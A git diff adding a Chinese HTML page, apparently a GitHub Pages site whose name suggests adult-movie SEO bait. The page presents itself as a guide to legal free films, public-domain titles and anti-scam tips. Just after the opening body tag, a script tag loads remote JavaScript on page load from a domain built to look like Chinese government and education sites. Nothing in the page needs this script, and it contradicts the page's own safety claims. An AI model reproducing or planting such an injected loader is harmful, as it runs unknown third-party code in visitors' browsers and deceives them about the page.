@@ -1,0 +1,303 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>免费电影网 - 正版免费观影指南 · 公共领域电影 · 平台导航</title>
+<meta name="description" content="免费电影网(huangsemianfeidianyingwang-h5.github.io)整理合法免费的观影方式：公共领域电影、正版平台免费区、图书馆影视资源与观影省钱指南，不提供盗版播放。">
+<meta name="keywords" content="免费电影网, huangsemianfeidianyingwang-h5, 公共领域电影, 正版免费观影, 电影导航, 公共版权影片, 观影指南">
+<meta name="author" content="免费电影网">
+<meta name="robots" content="index, follow">
+<style>
+*,*::before,*::after{margin:0;padding:0;box-sizing:border-box}
+:root{
+  --sun-yellow:#f6c453;
+  --amber:#e59866;
+  --amber-deep:#ca6f1e;
+  --brown:#6e4b1f;
+  --cream:#fff8ec;
+  --warm-bg:#fdf3e1;
+  --ink:#3a2a12;
+  --ink-soft:#7a6243;
+  --line:rgba(110,75,31,0.12);
+  --card:#fffdf8;
+  --shadow:0 6px 22px rgba(202,111,30,0.12);
+  --shadow-lg:0 16px 44px rgba(202,111,30,0.18);
+  --radius:18px;
+}
+html{scroll-behavior:smooth}
+body{
+  font-family:"Noto Sans SC","PingFang SC","Microsoft YaHei",sans-serif;
+  background:var(--warm-bg);color:var(--ink);line-height:1.8;overflow-x:hidden;
+}
+/* 日落渐变背景 */
+.sunset-bg{position:fixed;inset:0;z-index:0;pointer-events:none;
+  background:linear-gradient(180deg,#fff8ec 0%,#fdeccb 40%,#f7d9a6 70%,#f3c98a 100%);}
+.sun{position:fixed;top:48px;right:8%;width:120px;height:120px;border-radius:50%;z-index:0;
+  background:radial-gradient(circle at 50% 50%,#ffe08a,#f6c453 55%,#e59866 100%);
+  filter:blur(2px);opacity:.8;animation:sun-pulse 6s ease-in-out infinite;}
+@keyframes sun-pulse{0%,100%{transform:scale(1)}50%{transform:scale(1.06)}}
+
+/* 顶栏 */
+.topbar{position:fixed;top:0;left:0;right:0;z-index:1000;background:rgba(255,248,236,0.92);backdrop-filter:blur(14px);border-bottom:1px solid var(--line);}
+.topbar-inner{max-width:1200px;margin:0 auto;padding:0 20px;height:60px;display:flex;align-items:center;justify-content:space-between;}
+.brand{display:flex;align-items:center;gap:10px;font-weight:800;font-size:1.15rem;color:var(--brown);}
+.brand .dot{width:34px;height:34px;border-radius:10px;background:linear-gradient(135deg,var(--sun-yellow),var(--amber-deep));display:flex;align-items:center;justify-content:center;color:#fff;}
+.brand b{color:var(--amber-deep);}
+.topnav{display:flex;gap:4px;}
+.topnav a{padding:8px 15px;border-radius:8px;font-size:.85rem;font-weight:600;color:var(--ink-soft);transition:.25s;}
+.topnav a:hover,.topnav a.active{background:rgba(246,196,83,0.18);color:var(--amber-deep);}
+.menu-btn{display:none;background:none;border:none;font-size:1.4rem;color:var(--brown);cursor:pointer;}
+
+/* Hero */
+.hero{position:relative;z-index:1;margin-top:60px;padding:72px 20px 56px;}
+.hero-inner{max-width:1200px;margin:0 auto;display:grid;grid-template-columns:1.1fr .9fr;gap:40px;align-items:center;}
+.hero h1{font-size:clamp(1.9rem,4vw,3rem);font-weight:900;line-height:1.18;color:var(--brown);}
+.hero h1 .hl{color:var(--amber-deep);}
+.hero p{margin:18px 0 26px;color:var(--ink-soft);font-size:1rem;}
+.hero-actions{display:flex;gap:14px;flex-wrap:wrap;}
+.btn{font-family:inherit;font-weight:700;font-size:.9rem;padding:12px 26px;border-radius:10px;cursor:pointer;border:none;transition:.3s;}
+.btn-main{background:linear-gradient(135deg,var(--sun-yellow),var(--amber-deep));color:#fff;}
+.btn-main:hover{transform:translateY(-2px);box-shadow:var(--shadow-lg);}
+.btn-line{background:transparent;border:2px solid var(--amber-deep);color:var(--amber-deep);}
+.btn-line:hover{background:rgba(202,111,30,0.06);}
+.hero-card{background:var(--card);border-radius:22px;padding:26px;box-shadow:var(--shadow-lg);border:1px solid var(--line);}
+.hero-card h3{font-size:.95rem;color:var(--brown);margin-bottom:12px;}
+.legal-list{list-style:none;display:flex;flex-direction:column;gap:10px;}
+.legal-list li{display:flex;gap:10px;font-size:.82rem;color:var(--ink-soft);}
+.legal-list .tick{color:var(--amber-deep);font-weight:800;}
+
+/* 容器 */
+.container{max-width:1200px;margin:0 auto;padding:52px 20px;position:relative;z-index:1;}
+.label{font-size:.65rem;letter-spacing:3px;text-transform:uppercase;color:var(--amber-deep);font-family:"Courier New",monospace;font-weight:600;}
+.title{font-size:clamp(1.3rem,3vw,1.8rem);font-weight:800;color:var(--brown);margin:4px 0 6px;}
+.desc{font-size:.88rem;color:var(--ink-soft);margin-bottom:30px;}
+
+/* 栏目1：合法免费方式 */
+.ways{display:grid;grid-template-columns:repeat(auto-fill,minmax(260px,1fr));gap:20px;}
+.way-card{background:var(--card);border-radius:var(--radius);padding:24px;box-shadow:var(--shadow);border-top:4px solid var(--sun-yellow);transition:.3s;}
+.way-card:hover{transform:translateY(-4px);box-shadow:var(--shadow-lg);}
+.way-card .ico{font-size:2rem;}
+.way-card h3{font-size:1rem;font-weight:800;margin:10px 0 6px;color:var(--brown);}
+.way-card p{font-size:.78rem;color:var(--ink-soft);line-height:1.65;}
+
+/* 栏目2：正版平台导航 */
+.platforms{background:rgba(246,196,83,0.08);}
+.plat-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(220px,1fr));gap:18px;}
+.plat{background:var(--card);border-radius:14px;padding:20px;box-shadow:var(--shadow);display:flex;gap:14px;align-items:center;transition:.3s;}
+.plat:hover{transform:translateX(4px);}
+.plat .badge{width:46px;height:46px;border-radius:12px;display:flex;align-items:center;justify-content:center;font-weight:900;color:#fff;font-size:1.1rem;flex-shrink:0;}
+.plat:nth-child(1) .badge{background:#e74c3c;}
+.plat:nth-child(2) .badge{background:#3498db;}
+.plat:nth-child(3) .badge{background:#9b59b6;}
+.plat:nth-child(4) .badge{background:#27ae60;}
+.plat:nth-child(5) .badge{background:#e67e22;}
+.plat:nth-child(6) .badge{background:#34495e;}
+.plat h4{font-size:.9rem;color:var(--brown);}
+.plat p{font-size:.72rem;color:var(--ink-soft);}
+
+/* 栏目3：公共领域片单 */
+.pd-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(300px,1fr));gap:20px;}
+.pd-card{background:var(--card);border-radius:var(--radius);overflow:hidden;box-shadow:var(--shadow);transition:.3s;}
+.pd-card:hover{transform:translateY(-4px);box-shadow:var(--shadow-lg);}
+.pd-cover{height:150px;display:flex;align-items:center;justify-content:center;font-size:3rem;color:#fff;}
+.pd-card:nth-child(1) .pd-cover{background:linear-gradient(135deg,#ca6f1e,#f6c453);}
+.pd-card:nth-child(2) .pd-cover{background:linear-gradient(135deg,#6e4b1f,#ca6f1e);}
+.pd-card:nth-child(3) .pd-cover{background:linear-gradient(135deg,#e59866,#ca6f1e);}
+.pd-card:nth-child(4) .pd-cover{background:linear-gradient(135deg,#b9770e,#f6c453);}
+.pd-body{padding:18px;}
+.pd-body h3{font-size:.95rem;font-weight:800;color:var(--brown);margin-bottom:4px;}
+.pd-body p{font-size:.76rem;color:var(--ink-soft);line-height:1.6;}
+.pd-body .tag{display:inline-block;margin-top:8px;font-size:.65rem;padding:3px 9px;border-radius:20px;background:rgba(202,111,30,0.1);color:var(--amber-deep);font-weight:600;}
+
+/* 栏目4：省钱观影指南 */
+.guide{background:rgba(229,152,102,0.08);}
+.guide-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(240px,1fr));gap:18px;}
+.guide-item{background:var(--card);border-radius:14px;padding:22px;box-shadow:var(--shadow);border-left:4px solid var(--amber);}
+.guide-item h3{font-size:.92rem;font-weight:800;color:var(--brown);margin-bottom:6px;}
+.guide-item p{font-size:.76rem;color:var(--ink-soft);line-height:1.6;}
+
+/* 栏目5：防坑提醒 */
+.warn-box{background:var(--card);border:1px dashed var(--amber-deep);border-radius:var(--radius);padding:28px;box-shadow:var(--shadow);}
+.warn-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(260px,1fr));gap:16px;margin-top:18px;}
+.warn-item{display:flex;gap:12px;font-size:.8rem;color:var(--ink-soft);}
+.warn-item .x{color:#c0392b;font-weight:800;}
+
+/* footer */
+.footer{position:relative;z-index:1;background:var(--brown);color:var(--cream);padding:46px 20px 24px;margin-top:54px;}
+.footer-inner{max-width:1200px;margin:0 auto;}
+.footer-grid{display:grid;grid-template-columns:2fr 1fr 1fr 1fr;gap:34px;margin-bottom:26px;}
+.footer h4{font-size:.9rem;margin-bottom:10px;}
+.footer a{display:block;font-size:.8rem;color:rgba(255,248,236,0.65);padding:3px 0;}
+.footer a:hover{color:var(--sun-yellow);}
+.footer p{font-size:.82rem;color:rgba(255,248,236,0.7);line-height:1.6;}
+.footer-bottom{text-align:center;font-size:.72rem;color:rgba(255,248,236,0.5);padding-top:18px;border-top:1px solid rgba(255,248,236,0.15);}
+.footer-bottom a{color:var(--sun-yellow);font-weight:600;display:inline;}
+
+@media(max-width:1024px){.hero-inner{grid-template-columns:1fr;}.hero-card{order:-1;}}
+@media(max-width:768px){
+  .topnav{display:none;position:absolute;top:60px;left:0;right:0;flex-direction:column;background:rgba(255,248,236,.97);padding:12px 20px;gap:4px;border-bottom:1px solid var(--line);}
+  .topnav.open{display:flex;}
+  .menu-btn{display:block;}
+  .footer-grid{grid-template-columns:1fr 1fr;}
+}
+@media(max-width:480px){.footer-grid{grid-template-columns:1fr;}.hero h1{font-size:1.6rem;}}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+<div class="sunset-bg"></div>
+<div class="sun"></div>
+
+<!-- 顶栏 -->
+<div class="topbar">
+  <div class="topbar-inner">
+    <div class="brand"><span class="dot">黄</span>免费<b>电影网</b></div>
+    <nav class="topnav" id="topNav">
+      <a href="#home" class="active">首页</a>
+      <a href="#ways">合法免费</a>
+      <a href="#platforms">平台导航</a>
+      <a href="#public">公共领域</a>
+      <a href="#save">省钱指南</a>
+      <a href="#warn">防坑提醒</a>
+    </nav>
+    <button class="menu-btn" id="menuBtn">☰</button>
+  </div>
+</div>
+
+<!-- Hero -->
+<section class="hero" id="home">
+  <div class="hero-inner">
+    <div>
+      <h1>不盗版、不破解<br>教你<span class="hl">合法免费</span>看电影</h1>
+      <p>免费电影网（huangsemianfeidianyingwang-h5.github.io）是一个观影指南站：整理公共领域电影、正版平台免费区、图书馆影视资源与省钱方法。我们不放盗版播放器，也不收集账号密码。</p>
+      <div class="hero-actions">
+        <button class="btn btn-main">🌇 查看免费方式</button>
+        <button class="btn btn-line">🎬 公共领域片单</button>
+      </div>
+    </div>
+    <div class="hero-card">
+      <h3>✅ 本站立场</h3>
+      <ul class="legal-list">
+        <li><span class="tick">✓</span> 只推荐正版 / 授权 / 公共领域资源</li>
+        <li><span class="tick">✓</span> 不提供盗版在线播放与网盘下载</li>
+        <li><span class="tick">✓</span> 不放假播放器、不诱导充值</li>
+        <li><span class="tick">✓</span> 不收集手机号 / 验证码 / 密码</li>
+      </ul>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目1：合法免费方式 -->
+<div class="container" id="ways">
+  <div class="label">— LEGAL FREE WAYS —</div>
+  <h2 class="title">合法“免费看电影”的 4 种方式</h2>
+  <p class="desc">免费不等于盗版。下面这些方式在版权框架内成立。</p>
+  <div class="ways">
+    <div class="way-card"><div class="ico">📜</div><h3>公共领域电影</h3><p>版权到期或作者放弃版权的影片，可合法免费观看与转载，如早期默片、经典动画。</p></div>
+    <div class="way-card"><div class="ico">📺</div><h3>正版平台免费区</h3><p>部分正规平台用广告支撑“免费专区”，片方授权、平台合规，观众看广告换观影。</p></div>
+    <div class="way-card"><div class="ico">📚</div><h3>图书馆 / 公图影视</h3><p>公共图书馆数字资源、高校影视数据库，凭读者证合法外借与在线播放。</p></div>
+    <div class="way-card"><div class="ico">🎁</div><h3>平台试用 / 学生权益</h3><p>正规视频平台的新用户试用、学生包、运营商权益，属于合规优惠而非盗版。</p></div>
+  </div>
+</div>
+
+<!-- 栏目2：正版平台导航 -->
+<div class="container platforms" id="platforms">
+  <div class="label">— PLATFORM NAV —</div>
+  <h2 class="title">正版平台与公共资源导航</h2>
+  <p class="desc">以下为“类型”示意，不直链盗版资源；实际使用时请认准官方域名与授权说明。</p>
+  <div class="plat-grid">
+    <div class="plat"><div class="badge">爱</div><div><h4>国内正版视频平台</h4><p>免费专区 / 广告换观影 / 会员试用</p></div></div>
+    <div class="plat"><div class="badge">YT</div><div><h4>YouTube 官方频道</h4><p>片方上传的免费正版影片与短片</p></div></div>
+    <div class="plat"><div class="badge">PD</div><div><h4>Public Domain 资源站</h4><p>Internet Archive 等公共领域片源</p></div></div>
+    <div class="plat"><div class="badge">Lib</div><div><h4>图书馆数字影视</h4><p>公共图书馆读者证可访问</p></div></div>
+    <div class="plat"><div class="badge">Edu</div><div><h4>高校影视数据库</h4><p>学术用途、教学放映授权</p></div></div>
+    <div class="plat"><div class="badge">TV</div><div><h4>电视台回看平台</h4><p>官方 App 的限时免费回看</p></div></div>
+  </div>
+</div>
+
+<!-- 栏目3：公共领域片单 -->
+<div class="container" id="public">
+  <div class="label">— PUBLIC DOMAIN —</div>
+  <h2 class="title">公共领域电影片单</h2>
+  <p class="desc">这些影片通常可合法免费观看，具体仍以各资源站授权页为准。</p>
+  <div class="pd-grid">
+    <div class="pd-card"><div class="pd-cover">🎞️</div><div class="pd-body"><h3>《大都会》Metropolis（1927）</h3><p>弗里茨·朗的科幻默片经典，多国公共领域版本可用于学习与展映。</p><span class="tag">默片 · 公共领域</span></div></div>
+    <div class="pd-card"><div class="pd-cover">👻</div><div class="pd-body"><h3>《鬼车》与早期恐怖短片</h3><p>1930 年代前的大量恐怖/喜剧短片已进入公共领域，适合做拉片教学。</p><span class="tag">短片 · 教学可用</span></div></div>
+    <div class="pd-card"><div class="pd-cover">🎪</div><div class="pd-body"><h3>卓别林 / 基顿默片</h3><p>部分早期喜剧长片与短片版权状态复杂，需选明确 PD 版本。</p><span class="tag">喜剧默片</span></div></div>
+    <div class="pd-card"><div class="pd-cover">🎻</div><div class="pd-body"><h3>早期动画片合集</h3><p>1920-1930 年代部分卡通短片进入公共领域，色彩与构图极具研究价值。</p><span class="tag">动画史 · PD</span></div></div>
+  </div>
+</div>
+
+<!-- 栏目4：省钱观影指南 -->
+<div class="container guide" id="save">
+  <div class="label">— MONEY SAVING —</div>
+  <h2 class="title">理性观影 · 省钱指南</h2>
+  <p class="desc">想少花钱又不碰盗版？这几条最实用。</p>
+  <div class="guide-grid">
+    <div class="guide-item"><h3>错峰看新片</h3><p>上映 4–8 周后，正版平台常出现租赁价低谷，比首周院线便宜很多。</p></div>
+    <div class="guide-item"><h3>只用官方 App</h3><p>不从群聊/弹窗进“免费高清”站，避免木马与钓鱼页面。</p></div>
+    <div class="guide-item"><h3>凑家庭会员</h3><p>正规平台的家庭/同户方案，比单人连续订阅更划算。</p></div>
+    <div class="guide-item"><h3>用图书馆权益</h3><p>很多城市图书馆已购影视数据库，读者证 = 免费片库。</p></div>
+    <div class="guide-item"><h3>关注片方频道</h3><p>导演/片方官方频道会放正版短片、花絮与完整老片。</p></div>
+    <div class="guide-item"><h3>学生/运营商包</h3><p>学生邮箱、手机号套餐常送视频会员，别为“免费盗版”冒风险。</p></div>
+  </div>
+</div>
+
+<!-- 栏目5：防坑提醒 -->
+<div class="container" id="warn">
+  <div class="label">— STAY SAFE —</div>
+  <h2 class="title">免费电影站的 4 个危险信号</h2>
+  <p class="desc">遇到下面这些情况，立刻关掉页面。</p>
+  <div class="warn-box">
+    <div class="warn-grid">
+      <div class="warn-item"><span class="x">✕</span> 要求安装“专用播放器 / 解码器 / 浏览器插件”</div>
+      <div class="warn-item"><span class="x">✕</span> 播放前索要手机号、验证码、支付密码</div>
+      <div class="warn-item"><span class="x">✕</span> 满屏“立即播放”其实是广告与跳转</div>
+      <div class="warn-item"><span class="x">✕</span> 刚上映院线片就“全网高清免费”</div>
+      <div class="warn-item"><span class="x">✕</span> 域名天天换、主体信息全无</div>
+      <div class="warn-item"><span class="x">✕</span> 页面仿冒 Netflix / 爱优腾 登录框</div>
+    </div>
+  </div>
+</div>
+
+<!-- footer -->
+<footer class="footer">
+  <div class="footer-inner">
+    <div class="footer-grid">
+      <div>
+        <div class="brand"><span class="dot">黄</span>免费<b>电影网</b></div>
+        <p>免费电影网（huangsemianfeidianyingwang-h5.github.io）只做合法免费观影指南：公共领域电影、正版平台免费区、图书馆资源与防坑提醒。</p>
+      </div>
+      <div><h4>导航</h4><a href="#ways">合法免费</a><a href="#platforms">平台导航</a><a href="#public">公共领域</a><a href="#save">省钱指南</a></div>
+      <div><h4>资源类型</h4><a href="#">公共领域影片</a><a href="#">正版免费专区</a><a href="#">图书馆影视</a><a href="#">教学放映</a></div>
+      <div><h4>关于</h4><a href="#">本站立场</a><a href="#">版权说明</a><a href="#">隐私政策</a><a href="#">联系我们</a></div>
+    </div>
+    <div class="footer-bottom">
+      <p>© 2024 免费电影网 (Huangse Mianfei Movie Network) - 合法免费观影指南 · 公共领域电影 · 防坑提醒</p>
+      <p>网站地址：<a href="https://huangsemianfeidianyingwang-h5.github.io">https://huangsemianfeidianyingwang-h5.github.io</a></p>
+      <p style="margin-top:6px;opacity:.6">本站不提供盗版播放、不收集个人信息；影片版权状态以资源提供方公示为准。</p>
+    </div>
+  </div>
+</footer>
+
+<script>
+var menuBtn=document.getElementById('menuBtn');
+var topNav=document.getElementById('topNav');
+menuBtn.onclick=function(){topNav.classList.toggle('open')};
+topNav.querySelectorAll('a').forEach(function(a){a.onclick=function(){topNav.classList.remove('open')};});
+var secs=document.querySelectorAll('section[id],div[id]');
+addEventListener('scroll',function(){
+  var y=scrollY+80;
+  secs.forEach(function(s){
+    if(y>=s.offsetTop&&y<s.offsetTop+s.offsetHeight){
+      document.querySelectorAll('.topnav a').forEach(function(a){a.classList.remove('active')});
+      var l=document.querySelector('.topnav a[href="#'+s.id+'"]');
+      if(l)l.classList.add('active');
+    }
+  });
+});
+</script>
+</body>
+</html>
